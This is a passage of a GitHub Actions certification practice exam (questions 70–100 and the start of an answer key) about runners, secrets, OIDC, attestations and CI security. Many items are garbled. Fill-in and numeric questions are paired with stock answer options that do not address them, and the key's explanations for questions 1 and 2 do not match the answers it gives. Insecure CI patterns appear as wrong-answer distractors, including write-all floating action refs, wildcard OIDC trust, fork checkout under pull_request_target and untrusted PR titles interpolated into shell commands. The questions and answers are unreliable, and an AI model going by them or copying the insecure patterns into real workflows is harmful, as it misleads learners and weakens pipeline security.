- **A.** Enforce `Allow select actions and reusable workflows` (`GitHub-created`, `Verified creators`, internal `org/*`), **`Require actions to be pinned to a full-length commit SHA`**, and fork PR approvals
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **D.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs

### 70. An Enterprise Owner configures `Enterprise -> Policies -> Actions -> Fork pull request workflows from outside contributors -> Require approval for all outside collaborators`. Why might a security-conscious enterprise choose `all outside collaborators` over `first-time contributors` on public repositories?

- **A.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **B.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **C.** No — `on: pull_request_target` runs with base-repo `secrets.*` and write-capable `GITHUB_TOKEN`; checking out and executing untrusted fork PR code leaks secrets immediately
- **D.** Enforce `Allow select actions and reusable workflows` (`GitHub-created`, `Verified creators`, internal `org/*`), **`Require actions to be pinned to a full-length commit SHA`**, and fork PR approvals

### 71. SolsticeCloud Media designs a zero-trust software supply-chain architecture across all production repositories. Which three controls eliminate mutable dependencies, static cloud keys, and unverified artifacts? Select three.

- **A.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **B.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **C.** Eliminate static cloud keys with **OIDC** (`permissions: id-token: write`), validating `iss` (`https://token.actions.githubusercontent.com`), `aud`, and strict `sub` / `job_workflow_ref` claims in AWS/Azure/GCP/Vault
- **D.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback
- **E.** Enforce `Allow select actions and reusable workflows` (`GitHub-created`, `Verified creators`, internal `org/*`), **`Require actions to be pinned to a full-length commit SHA`**, and fork PR approvals
- **F.** Pin actions to **40-char commit SHAs** (`aligned with Immutable Actions`) and generate/verify **SLSA Artifact Attestations** (`actions/attest-build-provenance` / `actions/attest@v4` + `gh attestation verify`)

### 72. SolsticeCloud Media runs GPU video-encoding CI on autoscaling EC2 spot instances registered via `generate-jitconfig` (`ephemeral single-job runners`) and wants zero jobs ever interrupted mid-signing by multiple workflows sharing a VM. How many jobs does a JIT-configured (`--jitconfig` or `--ephemeral`) runner accept before terminating?

- **A.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **B.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **C.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners
- **D.** Combine standard/`ubuntu-slim` hosted runners, autoscaling **Larger runners** (static IPs, GPU, high RAM), and ephemeral self-hosted runners (`--ephemeral`, `generate-jitconfig`, Kubernetes `ARC` `gha-runner-scale-set`)

### 73. In SolsticeCloud Media's Kubernetes ARC (`gha-runner-scale-set`) deployment, security engineers prohibit privileged `dind` (`Docker-in-Docker`) sidecars and root containers, yet jobs do NOT use `container:`/`services:` (`they only compile Rust/Go and run Kaniko/crane`). Which lightweight ARC mode has the smallest attack surface and fastest pod startup?

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **C.** Combine standard/`ubuntu-slim` hosted runners, autoscaling **Larger runners** (static IPs, GPU, high RAM), and ephemeral self-hosted runners (`--ephemeral`, `generate-jitconfig`, Kubernetes `ARC` `gha-runner-scale-set`)
- **D.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)

### 74. When configuring authentication for GA `gha-runner-scale-set` at the Organization level (`githubConfigUrl: https://github.com/solsticecloud`), which three GitHub App credentials are stored in the Kubernetes Secret (`rather than a personal PAT`)?

- **A.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **B.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **C.** Combine standard/`ubuntu-slim` hosted runners, autoscaling **Larger runners** (static IPs, GPU, high RAM), and ephemeral self-hosted runners (`--ephemeral`, `generate-jitconfig`, Kubernetes `ARC` `gha-runner-scale-set`)
- **D.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners

### 75. SolsticeCloud Media needs GitHub-hosted `ubuntu-24.04-16core` Larger runners to test against a private Redis cluster inside Azure Virtual Network `vnet-media-prod` (`no public IPs`) with the Enterprise IP allow list enabled. Proposed solution: Delegate a subnet to `GitHub.Network/networkSettings`, link an Enterprise network configuration, attach it to Runner Group `media-vnet-runners` (`ubuntu-24.04-16core`), and allowlist the VNet NAT Gateway IP. Does this meet the goal?

- **A.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners
- **B.** Yes — the proposed configuration satisfies every stated GitHub Actions functional, security, and operational requirement
- **C.** Block outbound HTTPS `443` to `pkg.actions.githubusercontent.com` and `ghcr.io` on self-hosted runner firewalls while forcing Immutable Actions
- **D.** No — **Docker container actions** (`runs.using: "docker"`) execute **only on Linux runners** with Docker; cross-OS Linux/Windows/macOS actions require JavaScript (`node20`) or Composite actions

### 76. SolsticeCloud Media troubleshoots a newly deployed fleet of on-premises self-hosted Linux runners behind Palo Alto egress inspection where `actions/cache@v4`, `actions/upload-artifact@v4`, and Immutable Actions fail with TLS/403 errors. Which two network rules resolve these failures? Select two.

- **A.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners
- **B.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **C.** Connect Linux/Windows **Larger runners** to **Azure VNets** (`GitHub.Network/networkSettings` + Network Configurations), configure self-hosted `.env` proxies, and allow `pkg.actions.githubusercontent.com` + `ghcr.io`
- **D.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback
- **E.** Block outbound HTTPS `443` to `pkg.actions.githubusercontent.com` and `ghcr.io` on self-hosted runner firewalls while forcing Immutable Actions
- **F.** Attach **Azure Private Networking** (`GitHub.Network/networkSettings`) to Linux/Windows Larger runners and allow `*.actions.githubusercontent.com` (`pkg.actions...`) + `ghcr.io` on firewalls

### 77. SolsticeCloud Media assigns a GitHub-hosted Larger runner (`ubuntu-24.04-8core`) with **Static public IP range** enabled (`without Azure VNet`) to connect through an AWS security group into a staging RDS proxy. How many static public IPv4 addresses/ranges should you expect and how are they scoped?

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **C.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners
- **D.** Connect Linux/Windows **Larger runners** to **Azure VNets** (`GitHub.Network/networkSettings` + Network Configurations), configure self-hosted `.env` proxies, and allow `pkg.actions.githubusercontent.com` + `ghcr.io`

### 78. SolsticeCloud Media operates Runner Group `drm-hsm-runners` containing hardware DRM signing appliances. A repository admin in `solsticecloud/drm-signer` (`an allowed repo`) opens a feature branch editing `.github/workflows/test.yml` to `runs-on: { group: drm-hsm-runners }` to dump HSM slot metadata. Which Runner Group setting blocks unapproved feature-branch workflows?

- **A.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **B.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **C.** Isolate compute in Enterprise/Org **Runner Groups** (`Selected orgs` -> `Selected repos` -> `Selected workflows`, blocking `Public` repos) and inspect `_diag/Runner_*.log` vs `Worker_*.log`
- **D.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally

### 79. During peak release hours at SolsticeCloud Media, self-hosted jobs report slow git checkouts and intermittent runner listener drops. Which two `_diag/` and system metrics isolate network/CPU saturation on runner hosts? Select two.

- **A.** Deploy ephemeral `ARC` (`gha-runner-scale-set`) or Larger runners inside **Runner Groups** restricted to selected orgs, selected repos, and trusted workflow paths (`never Public repos`)
- **B.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners
- **C.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **D.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **E.** Isolate compute in Enterprise/Org **Runner Groups** (`Selected orgs` -> `Selected repos` -> `Selected workflows`, blocking `Public` repos) and inspect `_diag/Runner_*.log` vs `Worker_*.log`
- **F.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit

### 80. Complete the GitHub CLI / REST API query path used by SolsticeCloud Media's ops dashboard to list all Runner Groups configured in organization `solsticecloud`: `gh api /orgs/solsticecloud/actions/____`.

- **A.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **B.** Isolate compute in Enterprise/Org **Runner Groups** (`Selected orgs` -> `Selected repos` -> `Selected workflows`, blocking `Public` repos) and inspect `_diag/Runner_*.log` vs `Worker_*.log`
- **C.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **D.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release

### 81. SolsticeCloud Media pre-installs Node.js `20.18.0` (`arm64`) on custom self-hosted Linux ARM64 runners so `actions/setup-node@v4` (`node-version: '20.18.0'`) runs offline in <100 ms. Complete the exact tool-cache directory + marker path under `$RUNNER_TOOL_CACHE`: `node/20.18.0/arm64` and `node/20.18.0/____`.

- **A.** Check `actions/runner-images` release notes & `$RUNNER_TOOL_CACHE` (`setup-node`/`setup-python`/`setup-java` resolve cached binaries first or download + cache) vs custom golden images / `container:` jobs
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **D.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit

### 82. A self-hosted runner binary in `solsticecloud` falls more than 30 days behind a newly released GitHub Actions runner agent version while outbound auto-update downloads from `github.com/actions/runner/releases` were blocked on the firewall. What happens to queued jobs targeting that outdated runner?

- **A.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **B.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners
- **C.** Check `actions/runner-images` release notes & `$RUNNER_TOOL_CACHE` (`setup-node`/`setup-python`/`setup-java` resolve cached binaries first or download + cache) vs custom golden images / `container:` jobs
- **D.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally

### 83. SolsticeCloud Media stores `CDN_POP_LIST` (`a 52 KB JSON array`) and tries to save it inside a single Repository Actions secret, receiving a size-limit validation error! What is the maximum size of a single GitHub Actions secret (`and single configuration variable`)?

- **A.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **B.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **C.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **D.** Scope encrypted `secrets.*` (`<=48 KB`, write-only) and plain-text `vars.*` across `Organization`, `Repository`, and `Environment` (`precedence: Environment > Repository > Organization`)

### 84. SolsticeCloud Media's security architects audit how `secrets.*` and `vars.*` behave on fork PRs and across Deployment Environments. Which two statements hold true? Select two.

- **A.** Scope encrypted `secrets.*` (`<=48 KB`, write-only) and plain-text `vars.*` across `Organization`, `Repository`, and `Environment` (`precedence: Environment > Repository > Organization`)
- **B.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **C.** Scope sensitive credentials via `Environment > Repository > Organization` `secrets.*` (`encrypted via LibSodium on REST API`) and store plain-text parameters in `vars.*`
- **D.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **E.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback
- **F.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs

### 85. SolsticeCloud Media's DRM key-management service rotates Organization Actions secret `FAIRPLAY_ASK_HEX` every 12 hours across `3` selected repositories via the GitHub REST API. Order the App token, `/public-key` fetch, LibSodium sealed-box encryption, and `PUT` request steps.

- **A.** POST the plaintext secret to `/orgs/{org}/actions/variables` → Base64-encode without LibSodium encryption → Set `visibility: "all"` exposing secrets to `Public` repos → Read plaintext back via `GET /orgs/{org}/actions/secrets/{name}`
- **B.** Mint an App token (`organization_actions_secrets: write`) → GET `/orgs/{org}/actions/secrets/public-key` (`key_id`, `key`) → Encrypt value client-side via LibSodium `crypto_box_seal` → PUT `/orgs/{org}/actions/secrets/{name}` (`selected` repos)
- **C.** Name the secret `GITHUB_API_KEY` (`reserved GITHUB_ prefix`) → Upload a `96 KB` secret (`exceeding the 48 KB cap`) → Send unauthenticated curl calls → Expect Org secrets to override `production` Environment secrets
- **D.** Commit the encrypted blob into `.github/workflows/rotate.yml` → Encrypt with a local AES passphrase unknown to GitHub → Issue `admin:enterprise` classic PATs everywhere → Reboot self-hosted runners to load secrets

### 86. When `PUT /orgs/solsticecloud/actions/secrets/FAIRPLAY_ASK_HEX` sets `"visibility": "selected"`, complete the JSON body array field `"____": [104921, 104955, 108302]` (`numeric repository IDs`) that scopes which repositories can access the Organization secret.

- **A.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **B.** Manage secrets & variables programmatically via REST API (`encrypting secrets client-side with LibSodium crypto_box_seal against .../public-key`) or `gh secret set` / `gh variable set`
- **C.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **D.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step

---

## Domain 5 — Secure and optimize automation (10–15% official weight · 14 questions)

### 87. SolsticeCloud Media creates an internal GitHub App (` Datadog SLO Gate`) installed on `solsticecloud/cdn-edge` to block `environment: global-prod` deployments whenever real-time 5xx error burn rates exceed `0.5%`. Complete the GitHub webhook event `____` that GitHub sends to the App when a job reaches `environment: global-prod`.

- **A.** Gate deployments with **Environments** (`Required reviewers`, `Prevent self-review`, `Wait timer`, `Selected branches/tags`, **Custom deployment protection rules**) and vet Marketplace actions (`Verified creator`, source & SHA audit)
- **B.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **C.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **D.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback

### 88. In `solsticecloud/transcode-svc`, Environment `global-prod` sets `Deployment branches and tags` -> `Protected branches only`. A developer creates unguarded feature branch `hotfix/quick` (`with zero branch protection or ruleset rules`) and runs a workflow targeting `environment: global-prod`. Does `global-prod` allow the job to run?

- **A.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **B.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **C.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **D.** Gate deployments with **Environments** (`Required reviewers`, `Prevent self-review`, `Wait timer`, `Selected branches/tags`, **Custom deployment protection rules**) and vet Marketplace actions (`Verified creator`, source & SHA audit)

### 89. In `solsticecloud/cdn-edge`, a PR changelog generator runs `run: python3 scripts/changelog.py --title "${{ github.event.pull_request.title }}"`. Proposed solution: Leave `${{ github.event.pull_request.title }}` inside the `run:` shell command enclosed in double quotes. Does this meet the goal?

- **A.** No — interpolating `${{ github.event.pull_request.title }}` (`or head_ref / comment.body`) directly inside `run:` allows shell command injection; bind it to an `env:` variable first
- **B.** Prevent **script injection** by never interpolating untrusted `${{ github.event.* }}` (`PR title/body, branch head_ref, issue comment`) directly inside `run:`—bind via `env:` (`PR_TITLE: ${{ ... }}`) and quote `"$PR_TITLE"`
- **C.** Append `KEY=VALUE` to `$GITHUB_ENV`, paths to `$GITHUB_PATH`, outputs to `$GITHUB_OUTPUT`, and emit `::notice::` / `::error::` / `::add-mask::` commands
- **D.** Yes — the proposed configuration satisfies every stated GitHub Actions functional, security, and operational requirement

### 90. SolsticeCloud Media hardens custom Composite actions (`action.yml`) against input script injection when callers pass untrusted strings into `inputs.release-notes`. Which two practices inside a Composite action eliminate shell injection? Select two.

- **A.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **B.** Prevent **script injection** by never interpolating untrusted `${{ github.event.* }}` (`PR title/body, branch head_ref, issue comment`) directly inside `run:`—bind via `env:` (`PR_TITLE: ${{ ... }}`) and quote `"$PR_TITLE"`
- **C.** Pass untrusted `github.event.*` text (`PR titles, branch names, comments`) through intermediate `env:` variables (`never raw ${{ ... }} inside run:`) and never checkout untrusted forks in `pull_request_target`
- **D.** No — interpolating `${{ github.event.pull_request.title }}` (`or head_ref / comment.body`) directly inside `run:` allows shell command injection; bind it to an `env:` variable first
- **E.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **F.** No — `on: pull_request_target` runs with base-repo `secrets.*` and write-capable `GITHUB_TOKEN`; checking out and executing untrusted fork PR code leaks secrets immediately

### 91. In `solsticecloud/transcode-svc`, `actions/checkout@v4` runs on a `Private` repository, and at the end of the job `post:` cleanup guarantees the temporary `GITHUB_TOKEN` stored inside `.git/config` is wiped (`or never written if persist-credentials: false`). Complete the `actions/checkout@v4` input `____: false` that prevents `GITHUB_TOKEN` from remaining in `.git/config` during untrusted build steps.

- **A.** Enforce org-default `Read-only` `GITHUB_TOKEN`, grant minimal job-level `permissions:` (`e.g., contents: read, pull-requests: write`), and use short-lived **GitHub App installation tokens** (`not PATs`) for cross-repo calls
- **B.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback
- **C.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **D.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs

### 92. SolsticeCloud Media uses `actions/create-github-app-token@v1` (`pinned by 40-char SHA`) to mint a token for `solsticecloud/manifest-index` ONLY (`repositories: manifest-index`, `permissions: contents: write`). What happens automatically in that action's `post:` step when the job finishes?

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **C.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **D.** Enforce org-default `Read-only` `GITHUB_TOKEN`, grant minimal job-level `permissions:` (`e.g., contents: read, pull-requests: write`), and use short-lived **GitHub App installation tokens** (`not PATs`) for cross-repo calls

### 93. SolsticeCloud Media configures AWS IAM trust for OIDC provider `token.actions.githubusercontent.com` (`aud: sts.amazonaws.com`). To prevent sibling repos or feature branches in `solsticecloud` from assuming the production role, complete the strict `StringEquals` subject claim for `solsticecloud/cdn-edge` Environment `global-prod`: `"repo:solsticecloud/cdn-edge:____:global-prod"`.

- **A.** Eliminate static cloud keys with **OIDC** (`permissions: id-token: write`), validating `iss` (`https://token.actions.githubusercontent.com`), `aud`, and strict `sub` / `job_workflow_ref` claims in AWS/Azure/GCP/Vault
- **B.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback
- **C.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **D.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step

### 94. SolsticeCloud Media migrates `solsticecloud/drm-signer` AWS KMS signing deployments from static IAM keys to passwordless OIDC federated roles protected by `production` Environment reviewers. Order the Environment setup, IAM OIDC `aud`/`sub` pin, job YAML config, and runtime JWT exchange steps.

- **A.** Set cloud OIDC trust `sub` to wildcard `repo:*:*` → Omit `permissions: id-token: write` on the job → Leave `environment:` unset while expecting reviewer gates to pause → Store static cloud root keys in `vars.*`
- **B.** Gate `production` Environment (`reviewers`, `main`) → Pin cloud OIDC `aud` & `sub: repo:<o>/<r>:environment:production` → Set `environment: production` & `id-token: write` → Exchange OIDC JWT at runtime & purge static keys
- **C.** Run deploy on `pull_request_target` checking out untrusted fork PR code → Set `permissions: write-all` globally → Request OIDC tokens before Environment reviewers approve → Print cloud tokens to `$GITHUB_STEP_SUMMARY`
- **D.** Save a static OIDC JWT inside `secrets.OIDC_JWT` once a month → Disable TLS verification on cloud login steps → Skip `aud` validation in Vault → Allow developers to self-approve their own `production` runs

### 95. SolsticeCloud Media signs SLSA Build Level 3 provenance attestations (`actions/attest-build-provenance`) for `drm-signer` container digests and verifies provenance via `gh attestation verify` before edge deployment. Order the permissions, digest build, provenance signing, and CLI verification steps.

- **A.** Compile binaries on an unmonitored developer laptop outside Actions → Upload unsigned binaries to a public bucket → Pin third-party actions to floating `@main` → Delete attestation bundles prior to admission checks
- **B.** Compute an unsigned `md5sum` in bash → Commit private PGP signing keys into Git → Run `gh attestation verify` without `-R` / `--owner` → Disable Immutable Releases on prod artifacts
- **C.** Run `attest-build-provenance` with `permissions: read-all` only → Attest a mutable `:latest` image tag with no `sha256:` digest → Skip verification at deploy time → Edit build steps locally in caller repos
- **D.** Grant `id-token: write` & `attestations: write` in reusable CI → Build artifact / immutable `sha256:` image digest → Sign SLSA provenance via `actions/attest-build-provenance` → Verify via `gh attestation verify -R <o>/<r> --signer-workflow`

### 96. SolsticeCloud Media generates CycloneDX SBOM attestations AND SLSA build provenance attestations for release artifacts on `GitHub Enterprise Cloud`. Which two facts describe how GitHub Artifact Attestations work? Select two.

- **A.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **B.** Pin actions to **40-char commit SHAs** (`aligned with Immutable Actions`) and generate/verify **SLSA Artifact Attestations** (`actions/attest-build-provenance` / `actions/attest@v4` + `gh attestation verify`)
- **C.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **D.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback
- **E.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **F.** Use **OIDC** (`id-token: write`) with strict `sub`/`aud` claims for cloud auth and sign/verify **SLSA Artifact Attestations** (`attestations: write` + `gh attestation verify`)

### 97. In `solsticecloud/transcode-svc`, `actions/cache@v4` uses `key: Linux-vcpkg-${{ runner.arch }}-${{ hashFiles('vcpkg.json') }}` with `restore-keys: Linux-vcpkg-${{ runner.arch }}-`. Why MUST `${{ runner.os }}` and `${{ runner.arch }}` be included in native C/C++ cache keys?

- **A.** No — in `actions/upload-artifact@v4`, artifacts are **immutable** once uploaded; two matrix jobs uploading the exact same artifact `name:` fail with a `409 Conflict` unless uniquely named (`e.g., app-${{ matrix.os }}`)
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **D.** Accelerate builds with `actions/cache@v4` (`hashFiles` keys + `restore-keys` fallback) and lower storage spend via `retention-days` + REST API org/repo artifact & log retention caps

### 98. SolsticeCloud Media wants ephemeral Playwright failure screenshots retained for ONLY `3 days` while signed compliance PDF reports in the same repository stay retained for `60 days` (`within the org's 90-day ceiling`). Proposed solution: Pass `retention-days: 3` on the Playwright `actions/upload-artifact@v4` step and `retention-days: 60` on the compliance `actions/upload-artifact@v4` step. Does this meet the goal?

- **A.** No — writing to `$GITHUB_ENV` scopes variables strictly to subsequent steps **within the same job**; passing values to a downstream job requires `$GITHUB_OUTPUT` + `jobs.<id>.outputs` + `needs:`
- **B.** Yes — the proposed configuration satisfies every stated GitHub Actions functional, security, and operational requirement
- **C.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **D.** No — in `actions/upload-artifact@v4`, artifacts are **immutable** once uploaded; two matrix jobs uploading the exact same artifact `name:` fail with a `409 Conflict` unless uniquely named (`e.g., app-${{ matrix.os }}`)

### 99. SolsticeCloud Media runs a 20-leg OS/codec matrix on every PR commit (`including WIP draft commits`), whereas unit + lint checks run in 45 seconds on `ubuntu-24.04`. How should the workflow sequence `lint` vs the expensive 20-leg matrix to minimize wasted runner minutes when syntax/lint errors are pushed?

- **A.** Cut runner spend with `concurrency: { cancel-in-progress: true }`, path filters, Linux (`1x`) / `ubuntu-slim` over Windows (`2x`) / macOS (`10x`), lean matrices (`exclude`), and `timeout-minutes` caps
- **B.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **C.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **D.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners

### 100. Complete the `on: pull_request:` activity types list `[opened, synchronize, reopened, ____]` used alongside `if: github.event.pull_request.draft == false` so expensive GPU integration suites skip draft commits AND trigger automatically the moment an author clicks **Ready for review**.

- **A.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **B.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **C.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **D.** Cut runner spend with `concurrency: { cancel-in-progress: true }`, path filters, Linux (`1x`) / `ubuntu-slim` over Windows (`2x`) / macOS (`10x`), lean matrices (`exclude`), and `timeout-minutes` caps

---

## Answer Key and Explanations

### Question 1 — `A` (Author and manage workflows)

Correct answer: A (is correct). In GitHub Actions, `on: release: types: [published]` fires when a release transitions from draft (`or is created directly`) into a published release (`whereas created also fires for unpublished drafts`). [Skill 1.1: Configure workflows for scheduled, manual, and webhook events | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows)]

- **A:** Correct. GitHub Actions triggers span UTC `cron` schedules on the default branch, manual `workflow_dispatch`, Git/GitHub webhooks, and external REST `repository_dispatch` events.
- **B:** Incorrect. Pushing a `schedule:` workflow solely to a feature branch (`feat/nightly`) never triggers cron runs until merged into the default branch (`main`).
- **C:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **D:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.

### Question 2 — `D, E` (Author and manage workflows)

Correct answers: D and E (are correct). `on: schedule: [{ cron: '0 4 * * 0' }]` runs at 04:00 UTC on Sundays strictly from the default branch, while `on: workflow_dispatch` declares typed `inputs:` (`codec` `choice` and `crf` `number`) passed via `-f` flags in `gh workflow run`. [Skill 1.1: Configure workflows for scheduled, manual, and webhook events | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows)]

- **A:** Incorrect. Pushing a `schedule:` workflow solely to a feature branch (`feat/nightly`) never triggers cron runs until merged into the default branch (`main`).
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
